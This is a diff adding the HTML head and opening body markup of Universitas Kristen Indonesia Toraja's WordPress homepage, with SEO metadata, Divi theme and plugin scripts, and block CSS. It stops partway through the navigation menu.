@@ -1,0 +1,1999 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+	<meta charset="UTF-8" />
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<link rel="pingback" href="https://ukitoraja.ac.id/webx/xmlrpc.php" />
+
+	<script type="text/javascript">
+		document.documentElement.className = 'js';
+	</script>
+
+	<script 
+id="diviarea-loader">window.DiviPopupData=window.DiviAreaConfig={"zIndex":1000000,"animateSpeed":400,"triggerClassPrefix":"show-popup-","idAttrib":"data-popup","modalIndicatorClass":"is-modal","blockingIndicatorClass":"is-blocking","defaultShowCloseButton":true,"withCloseClass":"with-close","noCloseClass":"no-close","triggerCloseClass":"close","singletonClass":"single","darkModeClass":"dark","noShadowClass":"no-shadow","altCloseClass":"close-alt","popupSelector":".et_pb_section.popup","initializeOnEvent":"et_pb_after_init_modules","popupWrapperClass":"area-outer-wrap","fullHeightClass":"full-height","openPopupClass":"da-overlay-visible","overlayClass":"da-overlay","exitIndicatorClass":"on-exit","hoverTriggerClass":"on-hover","clickTriggerClass":"on-click","onExitDelay":2000,"notMobileClass":"not-mobile","notTabletClass":"not-tablet","notDesktopClass":"not-desktop","baseContext":"body","activePopupClass":"is-open","closeButtonClass":"da-close","withLoaderClass":"with-loader","debug":true,"ajaxUrl":"https:\/\/ukitoraja.ac.id\/webx\/wp-admin\/admin-ajax.php","sys":[]};var 
+divimode_loader=function(){"use strict";!function(t){t.DiviArea=t.DiviPopup={loaded:!1};var 
+n=t.DiviArea,i=n.Hooks={},o={};function r(t,n,i){var r,e,c;if("string"==typeof 
+t)if(o[t]){if(n)if((r=o[t])&&i)for(c=r.length;c--;)(e=r[c]).callback===n&&e.context===i&&(r[c]=!1);else 
+for(c=r.length;c--;)r[c].callback===n&&(r[c]=!1)}else o[t]=[]}function e(t,n,i,r){if("string"==typeof t){var 
+e={callback:n,priority:i,context:r},c=o[t];c?(c.push(e),c=function(t){var 
+n,i,o,r,e=t.length;for(r=1;r<e;r++)for(n=t[r],i=r;i>0;i--)(o=t[i-1]).priority>n.priority&&(t[i]=o,t[i-1]=n);return 
+t}(c)):c=[e],o[t]=c}}function c(t,n,i){"string"==typeof n&&(n=[n]);var 
+r,e,c=[];for(r=0;r<n.length;r++)Array.prototype.push.apply(c,o[n[r]]);for(e=0;e<c.length;e++){var a=void 
+0;c[e]&&"function"==typeof c[e].callback&&("filter"===t?void 
+0!==(a=c[e].callback.apply(c[e].context,i))&&(i[0]=a):c[e].callback.apply(c[e].context,i))}if("filter"===t)return 
+i[0]}i.silent=function(){return 
+i},n.removeFilter=i.removeFilter=function(t,n){r(t,n)},n.removeAction=i.removeAction=function(t,n){r(t,n)},n.applyFilters=i.applyFilters=function(t){for(var 
+n=[],i=arguments.length-1;i-- >0;)n[i]=arguments[i+1];return 
+c("filter",t,n)},n.doAction=i.doAction=function(t){for(var n=[],i=arguments.length-1;i-- 
+>0;)n[i]=arguments[i+1];c("action",t,n)},n.addFilter=i.addFilter=function(n,i,o,r){e(n,i,parseInt(o||10,10),r||t)},n.addAction=i.addAction=function(n,i,o,r){e(n,i,parseInt(o||10,10),r||t)},n.addActionOnce=i.addActionOnce=function(n,i,o,c){e(n,i,parseInt(o||10,10),c||t),e(n,(function(){r(n,i)}),1+parseInt(o||10,10),c||t)}}(window);return{}}();
+</script><meta name='robots' content='index, follow, max-image-preview:large, max-snippet:-1, 
+max-video-preview:-1' />
+<script type="text/javascript">
+			let jqueryParams=[],jQuery=function(r){return 
+jqueryParams=[...jqueryParams,r],jQuery},$=function(r){return 
+jqueryParams=[...jqueryParams,r],$};window.jQuery=jQuery,window.$=jQuery;let 
+customHeadScripts=!1;jQuery.fn=jQuery.prototype={},$.fn=jQuery.prototype={},jQuery.noConflict=function(r){if(window.jQuery)return 
+jQuery=window.jQuery,$=window.jQuery,customHeadScripts=!0,jQuery.noConflict},jQuery.ready=function(r){jqueryParams=[...jqueryParams,r]},$.ready=function(r){jqueryParams=[...jqueryParams,r]},jQuery.load=function(r){jqueryParams=[...jqueryParams,r]},$.load=function(r){jqueryParams=[...jqueryParams,r]},jQuery.fn.ready=function(r){jqueryParams=[...jqueryParams,r]},$.fn.ready=function(r){jqueryParams=[...jqueryParams,r]};</script>
+	<!-- This site is optimized with the Yoast SEO plugin v22.3 - https://yoast.com/wordpress/plugins/seo/ 
+-->
+	<title>Beranda - Universitas Kristen Indonesia Toraja</title>
+	<meta name="description" content="Universitas Kristen Indonesia Toraja (UKI Toraja) adalah salah satu 
+perguruan tinggi swasta yang besar dan populer di Toraja yang berdiri sejak tahun 1967. Pada awal berdirinya, 
+perguruan tinggi ini bernama College Pendidikan Guru (CPG). Kemudian pada tahun 1971 berganti nama menjadi 
+Sekolah Tinggi Keguruan Dan Ilmu Pendidikan (STKIP) Kristen Makale. Selanjutnya pada tanggal 05 Juni 1992, 
+melalui Surat Keputusan Direktur Jenderal Pendidikan Tinggi Departemen Pendidikan dan Kebudayaan RI Nomor: 
+237/DIKTI/Kep/1992 tentang perubahan bentuk Sekolah Tinggi Keguruan dan Ilmu Pendidikan Kristen Makale menjadi 
+Universitas Kristen Indonesia Toraja yang beralamat di Jalan Nusantara No 12." />
+	<link rel="canonical" href="https://ukitoraja.ac.id/webx/" />
+	<meta property="og:locale" content="en_US" />
+	<meta property="og:type" content="website" />
+	<meta property="og:title" content="Beranda - Universitas Kristen Indonesia Toraja" />
+	<meta property="og:description" content="Universitas Kristen Indonesia Toraja (UKI Toraja) adalah salah 
+satu perguruan tinggi swasta yang besar dan populer di Toraja yang berdiri sejak tahun 1967. Pada awal 
+berdirinya, perguruan tinggi ini bernama College Pendidikan Guru (CPG). Kemudian pada tahun 1971 berganti nama 
+menjadi Sekolah Tinggi Keguruan Dan Ilmu Pendidikan (STKIP) Kristen Makale. Selanjutnya pada tanggal 05 Juni 
+1992, melalui Surat Keputusan Direktur Jenderal Pendidikan Tinggi Departemen Pendidikan dan Kebudayaan RI Nomor: 
+237/DIKTI/Kep/1992 tentang perubahan bentuk Sekolah Tinggi Keguruan dan Ilmu Pendidikan Kristen Makale menjadi 
+Universitas Kristen Indonesia Toraja yang beralamat di Jalan Nusantara No 12." />
+	<meta property="og:url" content="https://ukitoraja.ac.id/webx/" />
+	<meta property="og:site_name" content="Universitas Kristen Indonesia Toraja" />
+	<meta property="article:modified_time" content="2024-03-04T06:08:47+00:00" />
+	<meta name="twitter:card" content="summary_large_image" />
+	<script type="application/ld+json" 
+class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"WebPage","@id":"https://ukitoraja.ac.id/webx/","url":"https://ukitoraja.ac.id/webx/","name":"Beranda 
+- Universitas Kristen Indonesia 
+Toraja","isPartOf":{"@id":"https://ukitoraja.ac.id/webx/#website"},"about":{"@id":"https://ukitoraja.ac.id/webx/#organization"},"datePublished":"2019-05-05T12:23:40+00:00","dateModified":"2024-03-04T06:08:47+00:00","description":"Universitas 
+Kristen Indonesia Toraja (UKI Toraja) adalah salah satu perguruan tinggi swasta yang besar dan populer di Toraja 
+yang berdiri sejak tahun 1967. Pada awal berdirinya, perguruan tinggi ini bernama College Pendidikan Guru (CPG). 
+Kemudian pada tahun 1971 berganti nama menjadi Sekolah Tinggi Keguruan Dan Ilmu Pendidikan (STKIP) Kristen 
+Makale. Selanjutnya pada tanggal 05 Juni 1992, melalui Surat Keputusan Direktur Jenderal Pendidikan Tinggi 
+Departemen Pendidikan dan Kebudayaan RI Nomor: 237/DIKTI/Kep/1992 tentang perubahan bentuk Sekolah Tinggi 
+Keguruan dan Ilmu Pendidikan Kristen Makale menjadi Universitas Kristen Indonesia Toraja yang beralamat di Jalan 
+Nusantara No 
+12.","breadcrumb":{"@id":"https://ukitoraja.ac.id/webx/#breadcrumb"},"inLanguage":"en-US","potentialAction":[{"@type":"ReadAction","target":["https://ukitoraja.ac.id/webx/"]}]},{"@type":"BreadcrumbList","@id":"https://ukitoraja.ac.id/webx/#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"name":"Home"}]},{"@type":"WebSite","@id":"https://ukitoraja.ac.id/webx/#website","url":"https://ukitoraja.ac.id/webx/","name":"Universitas 
+Kristen Indonesia 
+Toraja","description":"","publisher":{"@id":"https://ukitoraja.ac.id/webx/#organization"},"potentialAction":[{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://ukitoraja.ac.id/webx/?s={search_term_string}"},"query-input":"required 
+name=search_term_string"}],"inLanguage":"en-US"},{"@type":"Organization","@id":"https://ukitoraja.ac.id/webx/#organization","name":"Universitas 
+Kristen Indonesia 
+Toraja","url":"https://ukitoraja.ac.id/webx/","logo":{"@type":"ImageObject","inLanguage":"en-US","@id":"https://ukitoraja.ac.id/webx/#/schema/logo/image/","url":"https://i0.wp.com/ukitoraja.ac.id/webx/wp-content/uploads/2019/05/LOGO-UKI-KECIL.jpg?fit=200%2C189&ssl=1","contentUrl":"https://i0.wp.com/ukitoraja.ac.id/webx/wp-content/uploads/2019/05/LOGO-UKI-KECIL.jpg?fit=200%2C189&ssl=1","width":200,"height":189,"caption":"Universitas 
+Kristen Indonesia Toraja"},"image":{"@id":"https://ukitoraja.ac.id/webx/#/schema/logo/image/"}}]}</script>
+	<meta name="google-site-verification" content="aShBqLuOOv2cOJf_22pMa58AmgbYyQi5-3rFj6sowm0" />
+	<!-- / Yoast SEO plugin. -->
+
+
+<link rel='dns-prefetch' href='//stats.wp.com' />
+<link rel='dns-prefetch' href='//fonts.googleapis.com' />
+<link rel='dns-prefetch' href='//i0.wp.com' />
+<link rel='dns-prefetch' href='//c0.wp.com' />
+<link rel='dns-prefetch' href='//widgets.wp.com' />
+<link rel='dns-prefetch' href='//s0.wp.com' />
+<link rel='dns-prefetch' href='//0.gravatar.com' />
+<link rel='dns-prefetch' href='//1.gravatar.com' />
+<link rel='dns-prefetch' href='//2.gravatar.com' />
+<link rel='dns-prefetch' href='//jetpack.wordpress.com' />
+<link rel='dns-prefetch' href='//public-api.wordpress.com' />
+<link rel="alternate" type="application/rss+xml" title="Universitas Kristen Indonesia Toraja &raquo; Feed" 
+href="https://ukitoraja.ac.id/webx/feed/" />
+<link rel="alternate" type="application/rss+xml" title="Universitas Kristen Indonesia Toraja &raquo; Comments 
+Feed" href="https://ukitoraja.ac.id/webx/comments/feed/" />
+<link rel="alternate" type="text/calendar" title="Universitas Kristen Indonesia Toraja &raquo; iCal Feed" 
+href="https://ukitoraja.ac.id/webx/events/?ical=1" />
+<meta content="Divi v.4.21.0" name="generator"/><style id='wp-block-library-theme-inline-css' type='text/css'>
+.wp-block-audio figcaption{color:#555;font-size:13px;text-align:center}.is-dark-theme .wp-block-audio 
+figcaption{color:hsla(0,0%,100%,.65)}.wp-block-audio{margin:0 0 1em}.wp-block-code{border:1px solid 
+#ccc;border-radius:4px;font-family:Menlo,Consolas,monaco,monospace;padding:.8em 1em}.wp-block-embed 
+figcaption{color:#555;font-size:13px;text-align:center}.is-dark-theme .wp-block-embed 
+figcaption{color:hsla(0,0%,100%,.65)}.wp-block-embed{margin:0 0 
+1em}.blocks-gallery-caption{color:#555;font-size:13px;text-align:center}.is-dark-theme 
+.blocks-gallery-caption{color:hsla(0,0%,100%,.65)}.wp-block-image 
+figcaption{color:#555;font-size:13px;text-align:center}.is-dark-theme .wp-block-image 
+figcaption{color:hsla(0,0%,100%,.65)}.wp-block-image{margin:0 0 1em}.wp-block-pullquote{border-bottom:4px 
+solid;border-top:4px solid;color:currentColor;margin-bottom:1.75em}.wp-block-pullquote cite,.wp-block-pullquote 
+footer,.wp-block-pullquote__citation{color:currentColor;font-size:.8125em;font-style:normal;text-transform:uppercase}.wp-block-quote{border-left:.25em 
+solid;margin:0 0 1.75em;padding-left:1em}.wp-block-quote cite,.wp-block-quote 
+footer{color:currentColor;font-size:.8125em;font-style:normal;position:relative}.wp-block-quote.has-text-align-right{border-left:none;border-right:.25em 
+solid;padding-left:0;padding-right:1em}.wp-block-quote.has-text-align-center{border:none;padding-left:0}.wp-block-quote.is-large,.wp-block-quote.is-style-large,.wp-block-quote.is-style-plain{border:none}.wp-block-search 
+.wp-block-search__label{font-weight:700}.wp-block-search__button{border:1px solid #ccc;padding:.375em 
+.625em}:where(.wp-block-group.has-background){padding:1.25em 
+2.375em}.wp-block-separator.has-css-opacity{opacity:.4}.wp-block-separator{border:none;border-bottom:2px 
+solid;margin-left:auto;margin-right:auto}.wp-block-separator.has-alpha-channel-opacity{opacity:1}.wp-block-separator:not(.is-style-wide):not(.is-style-dots){width:100px}.wp-block-separator.has-background:not(.is-style-dots){border-bottom:none;height:1px}.wp-block-separator.has-background:not(.is-style-wide):not(.is-style-dots){height:2px}.wp-block-table{margin:0 
+0 1em}.wp-block-table td,.wp-block-table th{word-break:normal}.wp-block-table 
+figcaption{color:#555;font-size:13px;text-align:center}.is-dark-theme .wp-block-table 
+figcaption{color:hsla(0,0%,100%,.65)}.wp-block-video 
+figcaption{color:#555;font-size:13px;text-align:center}.is-dark-theme .wp-block-video 
+figcaption{color:hsla(0,0%,100%,.65)}.wp-block-video{margin:0 0 
+1em}.wp-block-template-part.has-background{margin-bottom:0;margin-top:0;padding:1.25em 2.375em}
+</style>
+<link rel='stylesheet' id='mediaelement-css' 
+href='https://c0.wp.com/c/6.4.4/wp-includes/js/mediaelement/mediaelementplayer-legacy.min.css' type='text/css' 
+media='all' />
+<link rel='stylesheet' id='wp-mediaelement-css' 
+href='https://c0.wp.com/c/6.4.4/wp-includes/js/mediaelement/wp-mediaelement.min.css' type='text/css' media='all' 
+/>
+<style id='jetpack-sharing-buttons-style-inline-css' type='text/css'>
+.jetpack-sharing-buttons__services-list{display:flex;flex-direction:row;flex-wrap:wrap;gap:0;list-style-type:none;margin:5px;padding:0}.jetpack-sharing-buttons__services-list.has-small-icon-size{font-size:12px}.jetpack-sharing-buttons__services-list.has-normal-icon-size{font-size:16px}.jetpack-sharing-buttons__services-list.has-large-icon-size{font-size:24px}.jetpack-sharing-buttons__services-list.has-huge-icon-size{font-size:36px}@media 
+print{.jetpack-sharing-buttons__services-list{display:none!important}}.editor-styles-wrapper 
+.wp-block-jetpack-sharing-buttons{gap:0;padding-inline-start:0}ul.jetpack-sharing-buttons__services-list.has-background{padding:1.25em 
+2.375em}
+</style>
+<style id='global-styles-inline-css' type='text/css'>
+body{--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: 
+#abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: 
+#f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: 
+#ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: 
+#7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: 
+#8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: 
+#9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 
+0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: 
+linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 
+100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: 
+linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 
+100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 
+0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: 
+linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: 
+linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 
+60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: 
+linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: 
+linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 
+100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 
+50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 
+0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: 
+linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: 
+linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 
+13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 
+36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 
+0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 
+2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 
+6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 
+0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px 
+-3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 
+1);}body { margin: 0;--wp--style--global--content-size: 823px;--wp--style--global--wide-size: 1080px; 
+}.wp-site-blocks > .alignleft { float: left; margin-right: 2em; }.wp-site-blocks > .alignright { float: right; 
+margin-left: 2em; }.wp-site-blocks > .aligncenter { justify-content: center; margin-left: auto; margin-right: 
+auto; }:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flow > 
+.alignleft{float: left;margin-inline-start: 0;margin-inline-end: 2em;}body .is-layout-flow > .alignright{float: 
+right;margin-inline-start: 2em;margin-inline-end: 0;}body .is-layout-flow > .aligncenter{margin-left: auto 
+!important;margin-right: auto !important;}body .is-layout-constrained > .alignleft{float: 
+left;margin-inline-start: 0;margin-inline-end: 2em;}body .is-layout-constrained > .alignright{float: 
+right;margin-inline-start: 2em;margin-inline-end: 0;}body .is-layout-constrained > .aligncenter{margin-left: 
+auto !important;margin-right: auto !important;}body .is-layout-constrained > 
+:where(:not(.alignleft):not(.alignright):not(.alignfull)){max-width: 
+var(--wp--style--global--content-size);margin-left: auto !important;margin-right: auto !important;}body 
+.is-layout-constrained > .alignwide{max-width: var(--wp--style--global--wide-size);}body 
+.is-layout-flex{display: flex;}body .is-layout-flex{flex-wrap: wrap;align-items: center;}body .is-layout-flex > 
+*{margin: 0;}body .is-layout-grid{display: grid;}body .is-layout-grid > *{margin: 0;}body{padding-top: 
+0px;padding-right: 0px;padding-bottom: 0px;padding-left: 0px;}a:where(:not(.wp-element-button)){text-decoration: 
+underline;}.wp-element-button, .wp-block-button__link{background-color: #32373c;border-width: 0;color: 
+#fff;font-family: inherit;font-size: inherit;line-height: inherit;padding: calc(0.667em + 2px) calc(1.333em + 
+2px);text-decoration: none;}.has-black-color{color: var(--wp--preset--color--black) 
+!important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) 
+!important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: 
+var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) 
+!important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) 
+!important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) 
+!important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) 
+!important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) 
+!important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) 
+!important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) 
+!important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) 
+!important;}.has-black-background-color{background-color: var(--wp--preset--color--black) 
+!important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) 
+!important;}.has-white-background-color{background-color: var(--wp--preset--color--white) 
+!important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) 
+!important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) 
+!important;}.has-luminous-vivid-orange-background-color{background-color: 
+var(--wp--preset--color--luminous-vivid-orange) 
+!important;}.has-luminous-vivid-amber-background-color{background-color: 
+var(--wp--preset--color--luminous-vivid-amber) 
+!important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) 
+!important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) 
+!important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) 
+!important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) 
+!important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) 
+!important;}.has-black-border-color{border-color: var(--wp--preset--color--black) 
+!important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) 
+!important;}.has-white-border-color{border-color: var(--wp--preset--color--white) 
+!important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) 
+!important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) 
+!important;}.has-luminous-vivid-orange-border-color{border-color: 
+var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: 
+var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: 
+var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: 
+var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: 
+var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: 
+var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: 
+var(--wp--preset--color--vivid-purple) 
+!important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: 
+var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) 
+!important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: 
+var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) 
+!important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: 
+var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) 
+!important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: 
+var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) 
+!important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: 
+var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) 
+!important;}.has-cool-to-warm-spectrum-gradient-background{background: 
+var(--wp--preset--gradient--cool-to-warm-spectrum) 
+!important;}.has-blush-light-purple-gradient-background{background: 
+var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: 
+var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: 
+var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: 
+var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: 
+var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: 
+var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: 
+var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: 
+var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: 
+var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: 
+var(--wp--preset--font-size--x-large) !important;}
+.wp-block-navigation a:where(:not(.wp-element-button)){color: inherit;}
+:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 
+1.25em;}
+:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
+.wp-block-pullquote{font-size: 1.5em;line-height: 1.6;}
+</style>
+<link rel='stylesheet' id='css-divi-area-css' 
+href='https://ukitoraja.ac.id/webx/wp-content/plugins/popups-for-divi/styles/front.min.css?ver=3.0.5' 
+type='text/css' media='all' />
+<style id='css-divi-area-inline-css' type='text/css'>
+.et_pb_section.popup{display:none}
+</style>
+<!-- `jetpack_likes` is included in the concatenated jetpack.css -->
+<link rel='stylesheet' id='et-builder-googlefonts-cached-css' 
+href='https://fonts.googleapis.com/css?family=Cabin:regular,500,600,700,italic,500italic,600italic,700italic|Amiko:regular,600,700|Bebas+Neue:regular|Aclonica:regular|Akaya+Telivigala:regular|Inconsolata:200,300,regular,500,600,700,800,900&#038;subset=latin,latin-ext&#038;display=swap' 
+type='text/css' media='all' />
+<link rel='stylesheet' id='divi-style-pum-css' 
+href='https://ukitoraja.ac.id/webx/wp-content/themes/Divi/style-static.min.css?ver=4.21.0' type='text/css' 
+media='all' />
+<link rel='stylesheet' id='jetpack_css-css' href='https://c0.wp.com/p/jetpack/13.2.2/css/jetpack.css' 
+type='text/css' media='all' />
+<script type="text/javascript" src="https://c0.wp.com/c/6.4.4/wp-includes/js/jquery/jquery.min.js" 
+id="jquery-core-js"></script>
+<script type="text/javascript" src="https://c0.wp.com/c/6.4.4/wp-includes/js/jquery/jquery-migrate.min.js" 
+id="jquery-migrate-js"></script>
+<script type="text/javascript" id="jquery-js-after">
+/* <![CDATA[ */
+jqueryParams.length&&$.each(jqueryParams,function(e,r){if("function"==typeof r){var 
+n=String(r);n.replace("$","jQuery");var a=new Function("return "+n)();$(document).ready(a)}});
+/* ]]> */
+</script>
+<script type="text/javascript" 
+src="https://ukitoraja.ac.id/webx/wp-content/plugins/popups-for-divi/scripts/ie-compat.min.js?ver=3.0.5" 
+id="dap-ie-js"></script>
+<script type="text/javascript" id="ai-js-js-extra">
+/* <![CDATA[ */
+var MyAjax = {"ajaxurl":"https:\/\/ukitoraja.ac.id\/webx\/wp-admin\/admin-ajax.php","security":"36cb8cb688"};
+/* ]]> */
+</script>
+<script type="text/javascript" 
+src="https://ukitoraja.ac.id/webx/wp-content/plugins/advanced-iframe/js/ai.min.js?ver=846378" 
+id="ai-js-js"></script>
+<link rel="https://api.w.org/" href="https://ukitoraja.ac.id/webx/wp-json/" /><link rel="alternate" 
+type="application/json" href="https://ukitoraja.ac.id/webx/wp-json/wp/v2/pages/2220" /><link rel="EditURI" 
+type="application/rsd+xml" title="RSD" href="https://ukitoraja.ac.id/webx/xmlrpc.php?rsd" />
+<link rel="alternate" type="application/json+oembed" 
+href="https://ukitoraja.ac.id/webx/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fukitoraja.ac.id%2Fwebx%2F" />
+<link rel="alternate" type="text/xml+oembed" 
+href="https://ukitoraja.ac.id/webx/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fukitoraja.ac.id%2Fwebx%2F&#038;format=xml" 
+/>
+<meta name="tec-api-version" content="v1"><meta name="tec-api-origin" 
+content="https://ukitoraja.ac.id/webx"><link rel="alternate" 
+href="https://ukitoraja.ac.id/webx/wp-json/tribe/events/v1/" />	<style>img#wpstats{display:none}</style>
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, 
+user-scalable=0" /><script>
+jQuery(document).ready(function() {
+  var downloadButton = jQuery('.download-button');
+     
+  downloadButton.each(function(index) {
+    jQuery(this).attr('download', '');
+  });
+});
+</script><link rel="icon" 
+href="https://i0.wp.com/ukitoraja.ac.id/webx/wp-content/uploads/2019/05/cropped-Logo-UKIT.png?fit=32%2C32&#038;ssl=1" 
+sizes="32x32" />
+<link rel="icon" 
+href="https://i0.wp.com/ukitoraja.ac.id/webx/wp-content/uploads/2019/05/cropped-Logo-UKIT.png?fit=192%2C192&#038;ssl=1" 
+sizes="192x192" />
+<link rel="apple-touch-icon" 
+href="https://i0.wp.com/ukitoraja.ac.id/webx/wp-content/uploads/2019/05/cropped-Logo-UKIT.png?fit=180%2C180&#038;ssl=1" 
+/>
+<meta name="msapplication-TileImage" 
+content="https://i0.wp.com/ukitoraja.ac.id/webx/wp-content/uploads/2019/05/cropped-Logo-UKIT.png?fit=270%2C270&#038;ssl=1" 
+/>
+<link rel="stylesheet" id="et-core-unified-2220-cached-inline-styles" 
+href="https://ukitoraja.ac.id/webx/wp-content/et-cache/2220/et-core-unified-2220.min.css?ver=1712577769" /><link 
+rel="stylesheet" id="et-core-unified-deferred-2220-cached-inline-styles" 
+href="https://ukitoraja.ac.id/webx/wp-content/et-cache/2220/et-core-unified-deferred-2220.min.css?ver=1712577769" 
+/></head>
+<body data-rsssl=1 class="home page-template-default page page-id-2220 tribe-no-js et_pb_button_helper_class 
+et_fullwidth_nav et_fixed_nav et_show_nav et_secondary_nav_enabled et_secondary_nav_only_menu 
+et_primary_nav_dropdown_animation_expand et_secondary_nav_dropdown_animation_fade et_header_style_left 
+et_pb_footer_columns4 et_cover_background windows et_pb_gutters3 et_pb_pagebuilder_layout et_no_sidebar 
+et_divi_theme et-db">
+	<div id="page-container">
+
+					<div id="top-header">
+			<div class="container clearfix">
+
+			
+				<div id="et-secondary-menu">
+				<ul id="et-secondary-nav" class="menu"><li class="menu-item 
